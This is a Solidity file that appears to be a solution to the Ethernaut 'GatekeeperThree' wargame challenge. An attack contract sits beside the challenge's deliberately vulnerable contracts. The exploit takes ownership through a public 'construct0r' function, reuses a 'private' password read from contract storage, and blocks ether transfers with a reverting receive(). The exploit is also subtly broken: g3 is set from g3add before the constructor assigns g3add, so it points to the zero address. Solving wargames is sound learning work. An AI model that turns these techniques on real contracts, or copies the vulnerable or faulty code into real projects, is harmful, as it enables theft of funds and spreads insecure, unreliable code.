// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @dev Contract to be deployed to win the challange
contract Hack {
  address payable g3add;
  uint256 passwordObtained;
  GatekeeperThree g3 = GatekeeperThree(g3add);

  /// @notice send more than 0.001 ether to the contract
  /// @param _g3add address of gateKeeperThree
  /// @param _passwordObtained  the value obtained by reading the private variable for gate2
  constructor(address payable _g3add, bytes memory _passwordObtained) payable{
    g3add = _g3add;

    /* Solidity doesn't allow conversion from bytes to uint,
     so extra step of conversion to bytes 32 and then uint256
    */
    bytes32 b32 = bytes32(_passwordObtained);
    passwordObtained = uint256(b32);
  }

  function attack() public {
    // gate 1 -> Become the owner by calling construct0r
    g3.construct0r();

    /*
     Gate 2 -> provide the password
     Password obtain using web3js in the browser console
     web3.eth.getStorageAt(addressOfTrick, 2)
    */
    g3.getAllowance(passwordObtained);

    // Gate 3 -> transfer ether
    g3add.transfer(0.0011 ether);

    // enter
    g3.enter();

    //Self destruct
    selfdestruct(payable(msg.sender));
  }

  // Gate 3 -> Return false
  receive() external payable {
    revert();
  }

}

// Stock code from ethernaut
contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }
    
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }
    
  function trickInit() public {
    trick = address(this);
  }
    
  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allowEntrance;

  SimpleTrick public trick;

  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allowEntrance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allowEntrance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree {
    entrant = tx.origin;
  }

  receive () external payable {}
}